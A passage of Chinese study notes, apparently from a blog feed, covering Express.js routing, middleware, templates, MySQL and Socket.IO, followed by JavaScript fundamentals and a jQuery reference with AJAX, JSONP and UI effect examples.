// :xx 表示参数占位,使用req.params读取参数
app.get('/tch/:tid', function(req,res){
    console.log(req.params);
    res.send('老师的工号是: '+req.params.tid);
});

// 多个路由参数
app.get('/goods/:name/:num', function(req,res){
    // 参数限制
    var name = req.params.name;
    var num = req.params.num;
    if (/\d+/.test(num)) {
        res.send('商品名: ' + name + ', 入库: ' + num + '件');
    } else {
        res.send('请填写正确的数量');
    }
});


// 设置请求监听
app.listen(3000);
```



2.3. 对模版引擎的支持

2.4. 静态文件/目录处理

## 3.路由

3.1. 路由的访问方式

3.2. 路由路径

3.3. 响应方法
    res.download()    提示下载文件。
    res.end()         终结响应处理流程。
    res.json()        发送一个JSON格式的响应。
    res.jsonp()       发送一个支持JSONP的JSON格式的响应
    res.redirect()    重定向请求。
    res.render()      渲染视图模板。
    res.send()        发送各种类型的响应。
    res.sendFile()    以八位字节流的形式发送文件。
    res.sendStatus()  设置响应状态代码，并将其以字符串形式作为响应体的一部分发送。

```

var express = require('express');
var app = express();

// 路由重名
// 路由中间件
app.get('/kk',function(req,res,next){
    console.log(1);
    next();
});

app.get('/kk',function(req,res){
    console.log(2);
    res.send('响应完成');
});


// 匹配冲突
app.get('/:goods/:num',function(req, res, next){
    // 做查询/匹配...
    if (false) {
        console.log(1);
        res.send('商品' + req.params.goods + '数量:'+req.params.num);
    } else {
        next();
    }
});

app.get('/admin/login',function(req,res){
    console.log(2);
    res.send('登录界面');
});

app.listen(3000);
```



## 4.中间件

4.1. 中间件概念

4.2. express路由 具有的中间件特性

4.3. app.use()的特性

app.use() 就是一个中间件,与get()/post()..方法不用的是,
它的URL不是精确匹配,而是模糊匹配

4.4. app.use()使用

```

var express = require('express');
var app = express();

// 全局中间件
app.use(function(req, res, next){
    console.log(new Date().toString());
    next();
});

// 中间件
app.use('/admin',function (req, res) {
    res.write(req.originalUrl + '\n'); // 完整的URL
    res.write(req.baseUrl + '\n');     // 基础URL
    res.write(req.path + '\n');        // 除去基础以外的URL
    res.end('后台...');
});

app.listen(3000);
```



4.5. 静态资源服务的说明

4.6. 404 页面的说明

------

## 5.模版引擎,渲染页面

5.1. 模版引擎 的设置和使用

5.2. 原生的 end() 与express的 send() 的区别

5.3. 设置响应头 和 状态码 和 MIME类型

```

var express = require('express');
var app = express();

// 指定框架的模版引擎,无需导入
app.set('view engine', 'ejs');

// 提供静态资源服务
// app.use(express.static('./static'));

// 默认使用 .ejs 为模版文件,目录views
// app.set('views', './pages');

app.get('/', function (req,res){
    // 绑定数据并渲染视图
    res.render('user', {
        'userlist' : [
            '钢铁侠 屎大颗',
            '绿巨人 浩克',
            '美队 史蒂文',
            '雷神 托尔',
            '邪神 洛基',
            '蜘蛛侠 彼得帕克'
        ]
    });
});

app.get('/hh', function (req,res){
    // node.js end()
    // express send()
    // 二进制
    // res.send(new Buffer('HOOH~'));

    // str
    // res.send('HOOH~');

    // JSON
    // res.send({name:"静静", sec:0});
    // ARRAY
    res.send([15,168,19681,9681,98,986884,true]);
    
});

app.listen(3000);
```



## 6.GET 与 POST

### 6.1 GET

GET请求的参数在URL中.
原生node中,要想得到get参数,需要借助于url模块来识别参数字符串.
在Express中，不需要使用url模块了.可以直接使用`req.query`对象得到GET参数

### 6.2 POST

GET请求的参数是隐蔽传参(在请求体中).
POST请求在Express中不能直接获得,必须使用`body-parser`模块.使用后,将可以用req.body得到参数.
但是如果表单中含有文件上传,那么还是需要使用`formidable`模块.

```

var express = require('express');
var bodyParser = require('body-parser');
var app = express();

// 指定框架的模版引擎,无需导入
app.set('view engine', 'ejs');


// parse application/x-www-form-urlencoded
//  解析 post数据
app.use(bodyParser.urlencoded({ extended: false }));

//GET参数
app.get('/', function (req,res){
    console.log(req.query);
    res.send('GET 完成');
});

app.get('/form', function (req,res){
    res.render('form');
});


// POST
app.post('/', function (req,res){
    console.log(req.body);
    res.send('POST 完成');
});


app.listen(3000);
```



## 7.Express对数据库的支持

7.1 数据库集成

7.2 连接mysql数据库

7.3 使用数据库 - 查/增/改/删

7.4 连接池

```

var express = require('express');
var mysql = require('mysql');
var app = express();

app.get('/', function(req,res){
    // 连接数据库
    var connection = mysql.createConnection({
        host     : '127.0.0.1',
        user     : 'root',
        password : '123456',
        database : 's86'
    });
    // 开启数据库
    connection.connect();

    // var sql = 'SELECT * FROM user';
    var sql = 'UPDATE user SET age="19" WHERE id="1"';
    connection.query(sql, function (err, result) {
        if (err) {
            console.log('执行出错: ' + err);
            return;
        }

        console.log(result);
        res.send(result);
    });

    connection.end();
});


app.listen(3000);
```





------

## 8.Web Socket和Socket.IO框架

### 8.1. HTTP的问题

HTTP无法轻松实现 实时应用：

- HTTP协议是无状态的，服务器只会响应来自客户端的请求，但是它与客户端之间不具备持续连接。(无法长时持续连接)
- 我们可以捕获浏览器上发生的事件（比如用户点击了button），这个事件可以产生与服务器的数据交互（比如Ajax）。
  但是，反过来却是不可能的：服务器端发生了一个事件，服务器无法将这个事件的信息实时主动通知它的客户端。只有在客户端查询服务器的当前状态的时候，所发生事件的信息才会从服务器传递到客户端。(无法主动输出信息)

但是,HTTP协议也能做聊天室这种'长连接'的东西,它是这么实现的:

- 长轮询：客户端每隔很短的时间，都会对服务器发出请求，查看是否有新的消息，只要轮询速度足够快，例如1秒，就能给人造成交互是实时进行的印象。这种做法是无奈之举，实际上对服务器、客户端双方都造成了大量的性能浪费。
- 长连接：客户端只请求一次，但是服务器会将连接保持，不会返回结果（想象一下我们没有写res.end()时，浏览器的小菊花会一直转）。服务器有了新数据，就将数据发回来，又有了新数据，就将数据发回来，而一直保持挂起状态。这种做法的也造成了大量的性能浪费。

### 8.2. WebSocket

WebSocket协议能够让浏览器和服务器全双工实时通信，互相的，服务器也能主动通知客户端了。

- WebSocket的原理非常的简单：利用HTTP请求产生握手，HTTP头部中含有WebSocket协议的请求，所以握手之后，二者转用TCP协议进行交流（QQ的协议）。现在的浏览器和服务器之间，就是QQ和QQ服务器的关系了。
  所以WebSocket协议，需要浏览器支持，更需要服务器支持。
- 支持WebSocket协议的浏览器有：Chrome 4、火狐4、IE10、Safari5
- 支持WebSocket协议的服务器有：Node、Apache Tomcat/7.0.27、Nginx1.3

### 8.3. Socket.IO

用原生Node搭建 WebSocket协议的服务 非常麻烦,我们使用写好的模块: Socket.IO
它屏蔽了所有底层细节，让顶层调用非常简单。
并且还为不支持WebSocket协议的浏览器(IE)，提供了长轮询的透明模拟机制。
Node的单线程、非阻塞I/O、事件驱动机制，使它非常适合Socket服务器。

官网：http://socket.io/

------

# chat_demo

## 初始化:

```
    npm init | 聊天室 | index.js
```

## 安装的组件:

```
    npm install express --save
    npm install ejs --save
    npm install socket.io --save
```

### 说明:

```
Express与Socket.IO
Express框架可以和Socket.IO搭配使用，但是不能像通常的Express程序那样，用app.listen进行监听了，而是采用一种固定的模式.
```

------

官方 画板 示例:
https://socket-io-whiteboard.now.sh/
官方 聊天室 示例:
https://socket-io-chat.now.sh/
官方socket.io 仓库:
https://github.com/socketio]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Node.js</tag>
        <tag>express</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 基础01-基本语法</title>
    <url>/2018/05/13/JavaScript%20%E5%9F%BA%E7%A1%8001-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[


# web 开发

- 前端
  - HTML    数据展示,负责内容
  - CSS     页面美化, 负责样式
  - JS      页面特效,与用户的交互.负责行为
- 后端
  - PHP
  - JAVA
  - python
  - asp.net
  - node.js
  - Ruby
  - Go

------

# javascript 简介

## 什么是 javascript

> 概念： javascript是 基于对象 和 事件驱动 并具有相对安全性的 客户端 脚本语言

- 发展简史
  1. Nombas 公司 1992 年开发 嵌入式脚本语言 C-- 后改名 ScriptEase
  2. Netscape公司 1995 年发布 LiveScript 后改名 javascript1.0
  3. 三足鼎立  NetScape 推出 javascript 1.1后, Microsoft 推出 Jscript , 加上 ScriptEase
  4. 标准化 1997 javascript 1.1 作为草案 提交给 `ECMA`（欧洲计算机制造商协会） .
     由来自 Netscape、Sun、微软、Borland 和其他一些对脚本编程感兴趣的公司的程序员
     组成的 TC39 锤炼出了 ECMA-262,该标准定义了名为 ECMAScript 的全新脚本语言.
- 组成
  - 核心（ECMAScript）
  - 文档对象模型（DOM）
  - 浏览器对象模型（BOM）
- 客户端浏览器上执行的脚本 JavaScript  VBScript...
- ECMAScript核心: JavaScript  ActionScript  ScriptEase
- 扩展衍生：node.js / phonegap框架 / vue.js / angular.js / React ...
- 浏览器
  - IE    IE6 7 8  /  IE9+
  - 非IE  Chrome  firefox  opera  Safari ...

> 浏览器占比统计: http://tongji.baidu.com/data/browser

- javascript 的特点
  - javascript 是一种脚本编程语言,也是一种解释性语言
  - javascript 的语法结构与C++、java 十分类似
  - javascript 是一种基于对象的语言
  - javascript 具有跨平台性.
  - 安全性与简单性
  - 基于对象（真正的对象 封装 继承 多态）
- java 与 javascript 的关系: 雷锋 和 雷峰塔
- javascript 优点与局限
  - 优点
    - javascript 在客户端运行,节省服务器资源
    - 方便的操控页面中的各个对象,使网页更加友好可控
    - 使多种任务仅在客户端就可以完成而不需要网络和服务器的参与,从而支持分布式的运算和处理
  - 局限
    - 兼容性问题,所有浏览器没有统一的标准
    - javascript 不能打开/读写/保存计算机上的文件.

------

> javascript 以下简称 JS

# JS 基本语法

## 在 HTML 中使用 JS

1. 写在 header 中的`<script></script>`标签内
2. 外部文件导入`<script src="script.js"></script>`标签内不能写代码
3. 通过 JS 事件写在标签内`<tag onclick="JS code...."></tag>`

## 基本语法

- 区分大小写 : `JS 所有的一切全都区分大小写`
- 标示符 : `不能以数字开头，可以由：数字/字母/下划线/$组成`
- 注释
  - 单行注释：  `// 注释`
  - 多行注释：  `/* 注释 */`
- 语句（指令结束符）: `;`  或  `换行`
- 关键字和保留字

```
ECMAScript 关键字的完整列表:
break    case    catch   continue    default
delete   do      else    finally     for
function if      in      instanceof  new
return   switch  this    throw       try
typeof   var     void    while       with
(关键字是保留的,不能用作变量名或函数名)
```

## 变量

```javascript
var 变量名 = 值;
var 变量名 = 值,变量名 = 值,变量名 = 值;
var 变量名 = 变量名 = 变量名 = 值;
```

## 数据类型

以下，是以我们熟悉的角度去分类：

- 基本类型
  - String （字串）
  - Number （数值）
  - Boolean （布尔）
- 复合类型
  - Ojbect （对象）
  - array （数组）
- 特殊类型
  - Null （空）
  - undefined （未定义）
  - function （函数）

> `typeof(aa)   typeof aaa`  返回一个值或变量的数据类型

## 字符串类型

- 定义字符串： `""` 或 `''`
- 不论是单引号还是双引号，都可以解析转义字符，都不能解析变量
- 字符串连接符 `+`

## 数值类型

- 数值的声明方式： 10 进制/ 8 进制/ 16 进制/ 科学计数法
- 数值范围
  - `5e324` ~ `1.7976931348623157e+308`
  - 超过范围会自动转换成 `infinity`(正无穷) `-infinity`(负无穷)
  - 可以使用 `isFinity()` 验证是不是无穷，超出范围不能参与运算
- `NaN` 类型： 数值的特殊类型，表示 Not a Number
  - NaN 与任何数字操作，结果都是 NaN
  - NaN 与任何数都不相等，包括 NaN 自己
  - 函数 `isNaN()` 判断是否是 NaN
- `Number()` 类型转换
  1. true -> 1 / false -> 0
  2. null -> 0
  3. undefined -> NaN
  4. 字符串
     1. 空字串 -> 0
     2. '11' -> 11 / '011' -> 11 (非进制转换)
     3. '0b10' -> 2 (2进制转换) / '0xff' -> 255 (16进制转换)
     4. '1.1' -> 1.1
     5. '12e3' -> 12000 (科学计数法解析)
     6. 如果包含除上述格式之外的字符，则将其转换成NaN
- `parseInt()` 类型转换
  1. 数字开头的字符串，只转换数字整数部分，忽略字母部分
  2. 0x开头的字串会转换成十六进制，0不可以
  3. 空字串 -> NaN
  4. true / false / null / undefined 都会被转为 NaN
  5. 科学计数法(字串)不解析
- `parseFloat()` 类型转换
  1. 基本同上
  2. 第一个小数点有效，第二个无效
  3. 数字开头的字符串，忽略后面的字母
  4. 科学计数法(字串)会解析其值
  5. 16 进制转换为 0

## 自动数据类型转换

- 数字类型:
  - 在字符串环境下 隐身转换为字符串
  - 字符串类型 在数字环境下，可以隐式转换为字符串中的数字或 NaN
  - 在布尔环境下，可以隐式转换为 true
- 空字符串:
  - 在数字环境下可以隐式转换为 0
  - 在布尔环境下可以隐式转换为 false
- 字符串'true':
  - 在数字环境下可以隐式转换位1
  - 布尔为 true
- 字符串'false':
  - 数字环境为 0
  - 布尔位 false
- null:
  - 在字符串环境下，转换为'null'
  - 数字环境下，转换为 0
  - 布尔环境下，转为 false
- NaN:
  - 在字符串环境下可以隐式转换为'NaN'
  - 布尔环境下，转换为 false
- undefined: 
  - 字符串环境下，转换为“undefined”
  - 数字环境下，转为 NaN 
  - 布尔下，转为 false
- true:
  - 字符串转为'true'
  - 数字环境下转为 1
- false:
  - 字符串转为'false'
  - 数字环境下转为 0



JavaScript数据类型转换--数字

|   数据    | number( ) | parseInt( ) | parseFloat( ) |
| :-------: | :-------: | :---------: | :-----------: |
|    123    |    123    |     123     |      123      |
|   12.7    |   12.7    |     12      |     12.7      |
|   0b011   |     3     |      3      |       3       |
|  "0b011"  |     3     |      0      |       0       |
|   "123"   |    123    |     123     |      123      |
| "12.1we"  |    NaN    |     12      |     12.1      |
| "12.1e1w" |    NaN    |     12      |      121      |
|    " "    |     0     |     NaN     |      NaN      |
|   true    |     1     |     NaN     |      NaN      |
|   null    |     0     |     NaN     |      NaN      |
| undefined |    NaN    |     NaN     |      NaN      |



------

# 运算符

- 算术运算符
  1. 加法运算符        +
  2. 减法运算符        -
  3. 乘法运算符        *
  4. 除法运算符        /
  5. 模运算符          %
  6. 负号运算符        -
  7. 正号运算符        +
  8. 递增运算符        ++
  9. 递减运算符        --
- 关系运算符
  0. 赋值运算符        =
  1. 相等运算符        ==
  2. 等同运算符        ===
  3. 不等运算符        !=
  4. 不等同运算符      !==
  5. 小于运算符        <
  6. 大于运算符        >
  7. 小于或等于运算符  <=
  8. 大于或等于运算符  >=
  9. in 运算符  判断一个值是否属于某个数组或者一个属性是否属于一个对象
  10. instanceof  判断一个对象的实例是否属于某个对象
  11. 字符串运算符  + 连字符
- 逻辑运算符
  1. 逻辑与   &&
  2. 逻辑或   ||
  3. 逻辑非   !
- 其他运算符
  1. 条件运算符  ?:
  2. new 运算符  new 对象类型
  3. void 运算符  void 运算符可以让操作数进行运算，但是却舍弃运算之后的结果
  4. typeof 运算符 返回类型
- 对象属性存取运算符
  - 使用`.`来调用和设置对象的属性或者方法 : `obj.attr`| `obj.func()`
- `delete` 运算符
  - delete 运算符可以用来删除变量/对象的属性/数组中的元素
  - delete 运算符返回的是布尔值类型
    - delete 对象名  /  delete 变量名
    - delete 对象名.属性
    - delete 数组[索引]
- 逗号运算符
  - `var a = 1, b = 2;`
  - `c = a + b, d = a - b;`
- `this` 运算符
  - `this` 代表的是当前对象.

------

# 其他语句

1. 判断语句 `if()...else if()...else...`
2. 判断语句 `switch()...case...break`
3. 迭代语句 `while`
4. 迭代语句 `do-while`
5. 迭代语句 `for`
6. 迭代语句 `for-in`
7. 立即退出循环 `break`
8. 退出当前循环 `continue`



# 获取页面之中的元素对象

1. **获取页面中的一个元素**

document.getElementById()
一定要写写在元素生成之后
或者 写在函数中



2. **获取或设置元素的** css 属性

element.style.color;
element.style.color = '#f00';

3. **获取或设置元素标签的属性**

style
innerHTML
HTML元素标签 具有什么属性,当它变为 JS的element对象之后,该属性就会自动变为 该对象的属性了.
(img: src alt title width height id class)
(div:  alt title  id class)

4. **定时函数**

4.1 **单次定时**
    setTimeout('JS 代码', time)
    clearTimeout()
4.2 **多次定时**
    setInterval('JS 代码', time)
    clearInterval()



------

# 特效-全选/反选

```

	<ul id="list">
		<li><input type="checkbox" value="0">小翠翠</li>
		<li><input type="checkbox" value="1">小艳艳</li>
		<li><input type="checkbox" value="2">小莉莉</li>
		<li><input type="checkbox" value="3">小静静</li>
		<li><input type="checkbox" value="4">小萍萍</li>
		<li><input type="checkbox" value="5">小红红</li>
	</ul>
	<button onclick="selectAll(1)">全选</button>
	<button onclick="selectAll(2)">全不选</button>
	<button onclick="selectAll(3)">反选</button>
	<hr>
	
	<script>
		//声明函数
		function selectAll(m){
		    //获取所有的li
			//var ul = document.getElementById('list');
			var lis =document.getElementById('list').getElementsByTagName('input');
			//遍历 li
			for (var i = 0; i < lis.length; i ++) {
				switch (m) {
					case 1: lis[i].checked = true; break;
					case 2: lis[i].checked = false; break;
					case 3: lis[i].checked = !lis[i].checked; break;
				}
			   
			}
		}
		
	</script>
```





]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript jQuery</title>
    <url>/2018/07/13/JavaScript%20jQuery/</url>
    <content><![CDATA[
# jQuery

# 1. jQuery 介绍

## 1.1 什么是 jQuery

jQuery 是 JavaScript 的类库

## 1.2 jQuery 特点

write less,do more (写得少 干得多)

## 1.3 jQuery 优势

- 开源
- 便捷的选择器
- 方便的 dom 操作
- 丰富的动画操作
- 简单的 ajax 操作
- 兼容性
- 方便的插件机制

## 1.4 jQuery 缺点

添加额外的 jQuery 文件，增加网络传输量

## 1.5 jQuery 版本

- jQuery 1.X   支持IE
- jQuery 2.X   IE9+  其他...
- jQuery 3.X   IE9+  支持最新的浏览器

# 2. jQuery的基本语法

`https://www.jquery.com/ [官网.手册]`
`http://www.jq22.com/chm/jquery/index.html`

## 2.1 jquery 入口标准的使用方式

```javascript
// 标准入口
$(document).ready(function (){
    JS code
});
// 简写入口
$(function (){
    JS CODE
});
```

## 2.2 onload 与 ready 的区别

- 触发点
  - ready  文档中的 DOM 加载完, 就触发
  - onload 文档中的 一切加载完, 才触发
- 绑定逻辑
  - ready 可以绑定多个事件(事件监听)
  - onload 后面的绑定会覆盖前的代码

```
    <script>
        // JS 
        window.onload = function(){
            console.log('onload1');
            // console.log(box);
        }
        window.onload = function(){
            console.log('onload2');
        }
        
        // JQ的标准入口
        $(document).ready(function(){
            console.log('ready1');
            // console.log(box);
        });
        $(document).ready(function(){
            console.log('ready2');
        });

    </script>
```



## 2.3 链式操作风格

JQDOM.css().attr().remove()....

## 2.4 jQueryDOM 与 JSDOM 的区别 以及相互转化

> 区别

- JQDOM 通过$()获取到一个数组对象
- JSDOM 通过各种方法获取到一个元素标签对象

> 转换

- JSDOM >>> JQDOM    $(JSDOM)
- JQDOM >>> JSDOM    JQDOM.get(index) 或 JQDOM[index]

```
    <h1>JQuery</h1>
    <hr>
    
    <div id="box">123456</div>

    <hr>
    <img src="./1.jpg" width="50" id="myimg" alt="">
    
    <script src="./jquery-3.3.1.min.js"></script>
    <script>
        $(function(){
            var box = document.getElementById('box'); // JS DOM
            var $box = $('#box'); // JQ DOM
            console.log(box);
            // console.log($box);
            
            box.style.backgroundColor = '#f00';
            // $box.style.backgroundColor = '#f90'; // NO
            $box.css('background-color', '#f90');
            // box.css('background-color', '#09f'); // NO

            myimg.width = 600;
            // $('#myimg').width = 4000; // NO
            $('#myimg').attr('width', '1000');

            // 互相转化
            // JSDOM ---> JQDOM
            $(box).css('background-color', '#09f');

            // JQDOM ---> JSDOM
            console.log($box[0]);
            console.log($box.get(0));
            $box.get(0).style.backgroundColor = '#feeeed';
        });

    </script>
```



## 2.5 jquery 命名冲突

$ 是 jQuery 的别名

------

# 3. jQuery 选择器

## 3.1 基本选择器

```javascript
*           通配符选择器
#id         ID选择器
.class      CLASS选择器
tagName     标签选择器
s1,s2,sN    组合/分组选择器
```

## 3.2 层级选择器

```javascript
selector selector    所有的后代元素
selector>selector    所有的子元素
selector+selector    紧邻着的下一个同辈元素
selector~selector    紧邻着的所有同辈元素
```

## 3.3 过滤选择器

```javascript
:first          首个
:last           最后一个
:eq(index)      指定第几个
:lt(index)      索引小于
:gt(index)      索引大于
:even           索引为偶数的 0索引也算为偶数
:odd            索引为奇数的
:header         所有的h标签
:not(selector)  排除指定选择器所选的元素
:root           根元素 html 1.9+
```

## 3.4 内容选择器

```javascript
:contains(text) 匹配包含指定文本的元素
:has(selector)  匹配含有选择器 所选择的元素的 元素
:parent         匹配含有子元素或文本的元素
:empty          匹配所有不含有子节点的元素
```

## 3.5 可见性选择器

```javascript
:visible        匹配所有可见元素
:hidden         匹配所有不可见元素
```

## 3.6 属性选择器

```javascript
selector[attribute]         选择有指定属性的元素
selector[attribute=value]   选择值等于value的元素
selector[attribute!=value]  选择值不等于value的元素
selector[attribute^=value]  选择值以value开头的元素
selector[attribute$=value]  选择值以value结尾的元素
selector[attribute*=value]  选择值包含value的元素
[][][][]...  属性选择器的进一步筛选
```

## 3.7 子元素选择器

```javascript
:first-child    选择首个子元素
:last-child     选择最后一个子元素
:only-child     选择唯一的子元素
:nth-child(n)   选择指定的第N个子元素
```

## 3.8 表单选择器

```javascript
:input          选择所有 input, textarea, select 和 button 元素. 
:text 
:password 
:radio 
:checkbox 
:submit 
:image 
:reset 
:button 
:file 
```

## 3.9 表单对象选择器

```javascript
:enabled     匹配所有的可用元素
:disabled    匹配所有的禁用元素
:checked     匹配所有的被选中的元素
:selected    匹配所有的被选中option元素
```

# 4. 筛选

## 4.1 过滤

```javascript
eq(index)           过滤出指定的某个
first()             过滤出首个
last()              过滤出最后一个
filter(selector)    满足指定选择器所选的元素
not(selector)       过滤排除
slice(start, end)   过滤出指定的一部分元素
has(selector)       过滤出 含有指定选择器所选的元素的元素

hasClass()          判断前面的集合中,是否包含有某个类
is()                判断前面的集合中,是否有某个元素符合指定的条件
map()               对JQdom的遍历,并且能取出一部分值出来
```

## 4.2 查找

> 都是具有破坏性,得到的对象,可能就不是前面集合的子集

```javascript
往里找:
    children()      只找子元素
    find()          找后代元素
往外找:
    parent()        父元素
    parents()       所有父级
    parentsUntil()  找到父级们,到指定位置为止
    offsetparent()  获取已定位的 父元素
    closest()       逐级向上找父级,返回找到的父级
往后找:
    next()          紧邻着的一个同级元素(后)
    nextAll()       紧邻着的所有同级元素(后)
    nextUntil()     紧邻着的所有同辈元素,直到某一个为止(后)
往前找:
    prev()          紧邻着的一个同级元素(前)
    prevAll()       紧邻着的所有同级元素(前)
    prevUntil()     紧邻着的所有同辈元素,直到某一个为止(前)
其他:
    siblings()      除了元素自己之外的所有同辈节点
```

## 4.3 串联

```javascript
add()               向集合内 追加元素
andSelf() / addBack() 把之前选中的集合加入到当前集合内
end()               返回最后一个 筛选操作之前的状态
contents()          获取所有的子节点(包括文本)
```

------

# 5. 文档处理

## 5.1 内部插入

```javascript
append()     内部最后
appendTo()   --
prepend()    内部最前
prependTo()  --
```

## 5.2 外部插入

```javascript
after()        外部之后
insertAfter()  --
before()       外部之前
insertBefore() --
```

## 5.3 包裹

```javascript
wrap()        将集合内的每一个元素 包裹在指定的元素内
wrapAll()     将整个集合元素 包裹在指定的元素内
unwrap()      去掉包裹
wrapInner()   将选中的元素里面的内容 包裹在一个标签内
```

## 5.4 替换

```javascript
replaceWith()  替换谁
replaceAll()   谁被替换
```

## 5.5 删除

```javascript
remove()      删除指定的元素
empty()       清空子节点
```

## 5.6 复制

```javascript
clone()  复制
```

------

# 6. 属性

## 6.1 属性操作

```javascript
attr()        读取/设置/修改 HTML属性 + 自定义属性
removeAttr()  移除 HTML属性 + 自定义属性

prop()        读取/设置/修改 HTML属性
removeProp()  移除 HTML属性
```

## 6.2 CSS 类

```javascript
addClass()     添加一个类属性
removeClass()  移除一个类属性
toggleClass()  以上俩 来回切换
```

## 6.3 HTML 代码/文本/值

```javascript
html()          相当于 innerHTML
text()          相当于 innerText
val()           相当于 .value  用于表单控件
```

------

# 7. CSS 操作

## 7.1 CSS

```javascript
// 设置样式
$('div').css('color', '#f00').css(.....);

// 多个样式,可用JSON作为参数传递多个样式
$('div').css({
    "color" : "#f00",
    "font-size" : "100px"
});

// 读取样式
$('div').css('color');
```

## 7.2 位置

```javascript
offset()     获取/设置  元素相对于整个文档的位置, left/top属性
position()   获取 已定位的父元素的位置

scrollTop()  获取/设置 滚动条距离上边的位置
scrollLeft() 获取/设置 滚动条距离左边的位置
```

## 7.3 尺寸

```javascript
(不加 内边距/边框)
width()  获取/设置  CSS设置的元素宽
height() 获取/设置  CSS设置的元素高

(不加边框)
innerWidth()  获取/设置  内容+内边距的宽
innerHeight() 获取/设置  内容+内边距的高

(标准元素大小: 内容+内边距+边框)
outerWidth()  获取/设置  实际的宽
outerHeight() 获取/设置  实际的高
```

------

# PS.

```javascript
$(window).height()   //浏览器时下窗口可视区域高度
$(document).height() //浏览器时下窗口文档的高度
$(document.body).height() //浏览器时下窗口文档body的高度
$(document.body).outerHeight(true) //浏览器时下窗口文档body的总高度 包括border padding margin
$(window).width()   //浏览器时下窗口可视区域宽度
$(document).width() //浏览器时下窗口文档对于象宽度
$(document.body).width() //浏览器时下窗口文档body的高度
$(document.body).outerWidth(true) //浏览器时下窗口文档body的总宽度 包括border padding margin

$(document).scrollTop()  //获取滚动条到顶部的垂直高度
$(document).scrollLeft() //获取滚动条到左边的垂直宽度
```

# 8. 事件

## 8.1 绑定事件 / 事件委派

1. 简写方式  `JQDOM.event(function(){})`
2. 标准绑定方式  `bind()` / `on()` [支持事件委托]
3. `one()`  绑定一次性 事件

## 8.2 解绑定

- `unbind()`
- `off()`  [支持 事件委派]

## 8.3 事件的自动触发

`trigger()`

## 8.4 阻止默认事件 和 事件冒泡

- 阻止默认事件: 在事件内使用 `return false`
- 使事件不冒泡: 在冒泡的事件内 `return false`

------

# 9. 动画效果

## 9.1 基本

```javascript
show()     显示
hide()     隐藏
toggle()   切换 显示/隐藏
```

## 9.2 滑动效果

```javascript
slideDown()   下滑动
slideUp()     上滑动
slideToggle() 切换 上/下滑动
```

## 9.3 淡入淡出

```javascript
fadeIn()      淡入
fadeOut()     淡出
fadeToggle()  切换  淡入/出
fadeTo()      指定透明度 0: 透明; 1: 不透明
```

## 9.4 自定义动画

```javascript
animate(JSON,time)  自定义动画
stop()       停止
delay()      延迟
```

# 10 ajax

## 10.1 ajax 请求

- JQDOM.load()  对象是 JQDOM
- $.get()       对象是 JQ本身
- $.post()
- $.ajax()

```
<body>
    <h1>JQ AJAX</h1>
    <button id="btn">加载</button>
    <hr>
    
    <div id="box"></div>

    
    <script src="./jquery-3.3.1.min.js"></script>
    <script>
    $(function (){
        $('#btn').click(function(){
            // load()
            // $('#box').load('./php/1.php');
            
            // get
            // $.get('./php/1.php', function(data){
            //     $('#box').html(data);
            // });
            
            // post
            // $.post('./php/1.php', function(data){
            //     $('#box').html(data);
            // });

            // ajax  
            $.ajax({
                // type : 'get',
                method : 'post',
                url    : './php/1.php',
                success: function (data){
                    $('#box').append(data +'<br>');
                },
                error  : function(){
                    alert('AJAX 执行失败');
                }
            });
        });
    });
    </script>
</body>
```

```
<body>
    <h1>JQ AJAX</h1>
    <button id="btn">加载</button>
    <hr>
    <hr>
    <div id="box"></div>

    
    <script src="./jquery-3.3.1.min.js"></script>
    <script>
    $(function (){
        $('#btn').click(function(){
            /*// get
            $.get('./php/4.php', function(data){
                // eval() / JSON.parse()
                console.log(data);
            }, 'json');*/

            // ajax  店长推荐
            $.ajax({
                // type : 'get',
                method : 'get',
                url    : './php/4.php',
                dataType : 'json',
                success: function (data){
                    console.log(data);
                    for (var i = 0; i < data.length; i++) {
                        $('<li>').html(data[i].name).appendTo('#box');
                    }
                },
                error  : function(){
                    alert('AJAX 执行失败');
                }
            });
        });
    });
    </script>
</body>
```



## 10.2 获取表单中数据

`serialize()`

## 10.3 jsonp 处理

`$.getScript()`

```
<body>
    <h1>JQ-JSONP</h1>
    <button onclick="loadHtml()">加载</button>
    <hr>

    <div id="box"></div>

    <script src="./jquery-3.3.1.min.js"></script>
    <script>
        function makedata(obj){
            // alert(obj);
            box.innerHTML = '';
            // JSON.parse()  // NO
            for (var i in obj) {
                box.innerHTML += i  + ' : ' + obj[i] + '<br>';
            }
        }

        // JSONP 关键步骤
        function loadHtml(){
            // // 创建JS对象
            // var js = document.createElement('script');
            // // 设置JS标签的src值
            // js.src = 'http://127.0.0.1/s86/JS16-JQ03/php/7.php';
            // // 添加这个JS对象到页面之中
            // document.body.appendChild(js);
            // 
            $.getScript('http://127.0.0.1/s86/JS16-JQ03/php/7.php');
        }

    </script>

</body>
```



# 11. jQuery 其他方法

```javascript
each()   遍历JQ DDM元素
get()    获取某个索引的元素
index()  当前元素的索引值
```

------

```
<body>
    <h1>JQ-其他</h1>
    <hr>

    <ul id="list">
        <li>赠汪伦 - 李先生</li>
        <li>李白乘舟将欲行，</li>
        <li>忽闻岸上踏歌声。</li>
        <li>桃花潭水深千尺，</li>
        <li>不及汪伦送我情。</li>
    </ul>


    <script src="./jquery-3.3.1.min.js"></script>
    <script>

        $('#list li').each(function (i, n){
            console.log(i, n, this, $(this).index());
        });

    </script>

</body>
```







# 特效-纵向导航条(手风琴)

```
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style type="text/css">
        *{
            list-style: none;
            margin: 0;
            padding: 0;
        }
        #nav{
            margin: 40px;
        }
        #nav h3{
            width: 200px;
            line-height: 40px;
            padding: 0 20px;
            border: 1px solid #999;
            background-color: #abcdef;
            cursor: pointer;
        }
        #nav ul{
            width: 242px;
            display: none;
        }
        #nav li{
            width: 200px;
            height: 40px;
            line-height: 40px;
            padding: 0 20px;
            border: 1px solid #aaa;
            background-color: #f5f5f5;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>JQ 纵向导航条 手风琴效果</h1>
    <hr>

    <div id="nav">
        <h3>用户管理</h3>
        <ul>
            <li><a>用户列表</a></li>
            <li><a>添加用户</a></li>
            <li><a>用户黑名单</a></li>
            <li><a>用户权限</a></li>
        </ul>
        <h3>分类管理</h3>
        <ul>
